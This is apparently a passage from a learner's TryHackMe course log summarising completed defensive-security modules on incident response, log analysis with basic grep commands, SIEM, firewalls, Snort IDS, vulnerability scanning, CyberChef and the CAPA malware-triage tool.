- Post-Incident Activity

### Response Tools & Technologies
- **SIEM (Security Information & Event Management)**: Centralized log correlation and alerting
- **EDR (Endpoint Detection & Response)**: Advanced threat protection and automated response
- **AV (Antivirus)**: Known malware detection and prevention
- **Playbooks**: Step-by-step incident handling guidelines
- **Runbooks**: Detailed technical execution procedures

### Incident Classification
- **Critical**: Business-threatening incidents (e.g., ransomware on critical systems)
- **High**: Significant damage potential (e.g., compromised admin accounts)
- **Medium**: Moderate risk (e.g., blocked phishing attempts)
- **Low**: Minimal impact (e.g., unauthorized software downloads)

## 🛠️ Practical Skills

### Playbook Development
- Phishing incident response procedures
- Malware outbreak containment strategies
- Data breach investigation protocols
- Denial of Service attack mitigation

### Crisis Communication
- Stakeholder notification procedures
- Law enforcement escalation paths
- Executive reporting during incidents
- Public relations coordination

### Tool Implementation
- SIEM alert correlation and analysis
- EDR automated response configuration
- Antivirus deployment and management
- Forensic tool integration

## 🎯 Professional Applications

### Organizational Preparedness
- Incident Response Plan development
- Team role definition and responsibility assignment
- Communication protocol establishment
- Tool stack selection and implementation

### Crisis Management
- Rapid incident triage and prioritization
- Effective containment strategy execution
- Thorough post-incident documentation
- Continuous improvement implementation

# Fundamentals of Records & Section 10 Completed | TryHackMe
## Completion Date: [2025/10/04]
## 🎯 Module Overview
Completion of the Log Fundamentals module and entire Section 10 (Defensive Security) covering comprehensive defensive security operations.

## 🔧 Log Analysis Skills

### Command Line Proficiency
```bash
# Pattern searching
grep "Failed password" auth.log

# Counting and statistics
grep "Failed" auth.log | wc -l

# Real-time monitoring
tail -f application.log

# Data extraction and correlation
grep "Failed" auth.log | cut -d' ' -f6 | sort | uniq -c
Log Types Mastered
System Logs: OS-level events and operations

Security Logs: Authentication and authorization events

Application Logs: Software-specific activities

Network Logs: Traffic and connection records

Cloud Logs: Cloud infrastructure activities

Analysis Techniques
Pattern recognition in large datasets

Timeline reconstruction from log events

Correlation across multiple log sources

Anomaly detection and alerting

Forensic investigation support

🛡️ Section 10 - Defensive Security Competencies
Security Operations Center (SOC)
SOC roles and responsibilities (Tier 1/2/3 Analysts, Engineers)

Three pillars framework: People, Processes, Technology

Alert triage and incident prioritization

Security tool integration (SIEM, EDR, Firewalls)

Digital Forensics
NIST 4-phase methodology: Collection, Examination, Analysis, Reporting

Evidence acquisition and chain of custody

Windows forensic analysis (Disk imaging, Memory analysis)

Metadata analysis (EXIF, PDF metadata, GPS coordinates)

Incident Response
SANS PICERL framework implementation

Incident classification and severity levels

Playbook development and execution

Crisis communication and stakeholder management

🎯 Practical Applications
Real-World Scenarios
Security incident investigation and response

Forensic analysis of compromised systems

Log-based threat detection and hunting

Compliance and audit requirement fulfillment

Continuous security monitoring implementation

Professional Development
Complete offensive-to-defensive skills transition

Enterprise security operations understanding

Regulatory compliance and legal considerations

Cross-functional team collaboration skills

#Introduction to SIEM
## Completion Date: [2025/10/04]

📚 Technical Content Mastered:

SIEM Implementation

Centralized log collection and event correlation

Real-time security monitoring and alerting

Forensic analysis capabilities

Firewall Architecture

Network traffic filtering based on predefined rules

Inbound/outbound traffic control methodologies

Policy implementation and management

IDS/IPS Systems

Intrusion Detection Systems (passive monitoring)

Intrusion Prevention Systems (active blocking)

Signature-based and anomaly-based detection

Vulnerability Assessment

Systematic vulnerability scanning methodologies

Identification of security weaknesses in systems

Reporting and prioritization of discovered vulnerabilities

🛠️ Competencias Técnicas:

Security event management

Network perimeter defense

Threat detection and prevention

Vulnerability assessment procedures

# Firewall Fundamentals - TryHackMe
## Completion Date: [2025/10/04]

🔧 Technical Skills Acquired:

Firewall Types & Architectures

Stateless vs Stateful firewall operation and differences

Application-level gateway (Proxy firewall) implementation

Deep packet inspection capabilities analysis

Rule-Based Filtering Systems

Policy design: default-deny vs default-allow strategies

Rule optimization and order of execution management

Source/Destination/Protocol based filtering methodologies

Security Policy Implementation

Principle of least privilege in network access

Service-specific rule creation (HTTP, SSH, DNS, etc.)

Threat-based rule configuration and management

Technical Evaluation Criteria

Performance impact assessment of different firewall types

Security effectiveness metrics for firewall solutions

Deployment scenario analysis for optimal protection

🛠️ Technical Competencies:

Network perimeter security design

Firewall policy development and management

Traffic filtering rule optimization

Security architecture evaluation

# Security Solutions 
## Completion Date: [2025/10/04]

🔧 Technical Skills Acquired::

SIEM Systems

Centralized security event management architecture

Log correlation from multiple sources (firewalls, IDS, servers)

Real-time alerting and forensic analysis capabilities

Firewall Technologies

Stateless vs Stateful vs Application-level firewalls

Rule-based filtering policy development

Default-deny strategy implementation and optimization

Intrusion Detection/Prevention

IDS (monitoring/alerting) vs IPS (blocking) operational differences

Signature-based and anomaly-based detection methodologies

Network-based (NIDS) and Host-based (HIDS) deployment

Snort IDS Implementation

Rule syntax and custom rule creation

Real-time traffic analysis configuration

PCAP file forensic analysis capabilities

Alert management and log review procedures

Vulnerability Assessment

Systematic vulnerability scanning methodologies

Security weakness identification in network systems

Reporting and remediation prioritization frameworks

🛠️ Technical Competencies:

Security information and event management

Network perimeter defense strategies

Intrusion detection system deployment

Vulnerability assessment procedures

Security tool configuration and optimization

# Vulnerability Scanner Overview
## Completion Date: [2025/10/04]

🔧  Technical Skills Acquired:
SIEM Systems Architecture

Centralized security event management and log aggregation

Multi-source log correlation for early threat detection

Real-time alerting configuration and forensic analysis

Firewall Technologies & Deployment

Stateless vs Stateful vs Application-level firewall operational differences

Rule-based filtering policy development and optimization

Default-deny strategy implementation and traffic flow management

Intrusion Detection/Prevention Systems

IDS (monitoring/alerting) vs IPS (active blocking) architectural differences

Signature-based and anomaly-based detection methodologies

Network-based (NIDS) and Host-based (HIDS) deployment scenarios

Snort IDS Implementation & Management

Custom rule syntax creation and testing procedures

Real-time network traffic analysis configuration

PCAP file forensic analysis and historical investigation

Alert management, log review, and reporting procedures

Vulnerability Assessment Framework

Systematic vulnerability scanning methodologies and tool selection

Security weakness identification across network infrastructure

Scanning process: planning, execution, analysis, and remediation

Compliance and continuous improvement frameworks

🛠️ Technical Competencies:

Security information and event management implementation

Network perimeter defense strategy development

Intrusion detection system deployment and configuration

Vulnerability assessment and management procedures

Security tool optimization and operational integration

#CyberChef Basics 
## Completion Date: [2025/10/05]

🔧 Technical Skills Acquired:

Data Transformation Operations

Base64, Hex, URL encoding/decoding methodologies

Basic cryptographic operations (XOR, ROT13, Vigenère cipher)

Data format conversion and normalization techniques

Workflow Automation

Recipe creation and management for repetitive tasks

Operation chaining for complex data processing pipelines

Input/Output handling for various data formats and sources

Security Analysis Applications

Malware payload decoding and configuration extraction

IOC (Indicators of Compromise) pattern matching and extraction

Forensic metadata processing and timestamp conversion

Network traffic and log data manipulation

Tool Integration Understanding

Interface navigation and operational parameter configuration

Large-scale processing limitations and alternative tool requirements

Cross-tool compatibility for advanced analysis workflows

🛠️ Technical Competencies:

Data manipulation and transformation techniques

Security artifact analysis and processing

Automated workflow development for repetitive tasks

Cross-format data conversion and normalization

# CAPA Basics 
## Completion Date: [2025/10/05]
🔧 Technical Skills Acquired:

Static Analysis Methodology

Capability-based analysis vs traditional signature detection

Safe executable examination without execution risk

Rapid triage and assessment workflows

CAPA Tool Operation

Command-line interface and parameter usage

Output interpretation: capabilities and meta-capabilities

JSON format for automated processing and integration

Malware Capability Detection

Network operations (internet connectivity, DNS, HTTP)

System manipulation (file system, registry, processes)

Anti-analysis techniques (VM detection, debugging evasion)

Analysis Integration

Complementary role to dynamic analysis tools

Quick assessment prioritization for incident response

Pattern recognition for threat hunting activities

🛠️ Technical Competencies:

Static malware analysis techniques

Capability-based threat assessment

Command-line tool operation and output parsing

Security tool integration strategies
